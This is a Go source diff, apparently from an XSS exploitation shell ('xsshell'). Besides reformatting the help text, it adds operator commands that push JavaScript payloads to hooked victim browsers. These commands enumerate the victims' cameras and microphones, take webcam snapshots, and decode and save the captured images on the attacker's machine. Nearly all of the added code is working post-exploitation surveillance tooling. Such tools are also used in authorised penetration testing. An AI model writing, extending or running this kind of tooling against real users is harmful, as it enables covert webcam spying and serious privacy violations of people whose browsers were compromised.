@@ -110,11 +110,17 @@ func (s *Shell) help(input string) {
 		done[cmd] = true
 	}
 
+	lPad := strings.Repeat(" ", longest+2)
+	lPad2 := strings.Repeat(" ", longest+6)
+	lPad3 := strings.Repeat(" ", longest)
 	for _, v := range cmdOrdered {
-		pad := strings.Repeat(" ", longest-len(v.name)+1)
+		padding := longest - len(v.name) + 1
+		v.desc = strings.Replace(v.desc, "\n", "\n"+lPad, -1)
+		v.usage = strings.Replace(v.usage, "\n", "\n"+lPad2, -1)
+		pad := strings.Repeat(" ", padding)
 		var out string
 		if v.usage != "" {
-			out = fmt.Sprintf("%s:%s%s\n\tusage: %s\n", v.name, pad, v.desc, v.usage)
+			out = fmt.Sprintf("%s:%s%s\n\t%susage: %s\n", v.name, pad, v.desc, lPad3, v.usage)
 		} else {
 			out = fmt.Sprintf("%s:%s%s\n", v.name, pad, v.desc)
 		}
@@ -329,6 +335,92 @@ func (s *Shell) promptForLogin(input string) {
 		_, err := s.consoleBufferWrapped(sock, h, tsStr("prompt for login response", data))
 		return err
 	})
+}
+
+func (s *Shell) enumerateMediaDevices(input string) {
+	s.sendToTargetsAck(payloads.JSEnumerateMediaDevices, func(sock *socket, h *header, data []byte) error {
+		devices := []mediaDevice{}
+		err := json.Unmarshal(data, &devices)
+		if err != nil {
+			return err
+		}
+
+		buf := bytes.NewBuffer(nil)
+		for _, d := range devices {
+			buf.WriteString("kind:  ")
+			buf.WriteString(d.Kind)
+			buf.WriteString("\nlabel: ")
+			buf.WriteString(d.Label)
+			buf.WriteString("\nid:    ")
+			buf.WriteString(d.DeviceID)
+			buf.WriteString("\ngid:   ")
+			buf.WriteString(d.GroupID)
+			buf.WriteString("\n\n")
+		}
+
+		_, err = s.consoleBufferWrapped(sock, h, tsStr("media devices", buf.Bytes()))
+		return err
+	})
+}
+
+func (s *Shell) webcamSnapshot(input string) {
+	imgDir := input
+	if input == "" || input[0] != '/' {
+		imgDir = filepath.Join(s.c.WrkDir, input)
+	}
+
+	//write test
+	touchFile := filepath.Join(imgDir, ".xsshellwritetest")
+	err := ioutil.WriteFile(touchFile, []byte{0}, 0600)
+	if err != nil {
+		s.Err(err)
+		return
+	}
+
+	err = os.Remove(touchFile)
+	if err != nil {
+		s.Err(err)
+		return
+	}
+
+	s.sendToTargetsAck(payloads.JSWebcamSnapshot, func(sock *socket, h *header, data []byte) error {
+		msg := data
+		prefix := []byte("data:image/jpeg;base64,")
+		if bytes.HasPrefix(data, prefix) {
+			b64Data := data[len(prefix):]
+			imgData := make([]byte, base64.StdEncoding.DecodedLen(len(b64Data)))
+			n, err := base64.StdEncoding.Decode(imgData, b64Data)
+			if err != nil {
+				return err
+			}
+			imgData = imgData[:n]
+			imgSumRaw := md5.Sum(imgData)
+			imgSum := imgSumRaw[:]
+
+			imgFileName := "xsshell_webcam_download_" + hex.EncodeToString(imgSum) + ".jpg"
+			imgPath := filepath.Join(imgDir, imgFileName)
+
+			if fileExists(imgPath) {
+				msg = []byte("skipping already downloaded file: " + imgPath)
+			} else {
+				err = ioutil.WriteFile(imgPath, imgData, 0600)
+				if err != nil {
+					return err
+				}
+				msg = []byte("image downloaded to: " + imgPath)
+			}
+		}
+
+		_, err := s.consoleBufferWrapped(sock, h, tsStr("webcam response", msg))
+		return err
+	})
+}
+
+type mediaDevice struct {
+	Kind     string `json:"kind"`
+	Label    string `json:"label"`
+	GroupID  string `json:"groupId"`
+	DeviceID string `json:"deviceId"`
 }
 
 type cmdFormat struct {
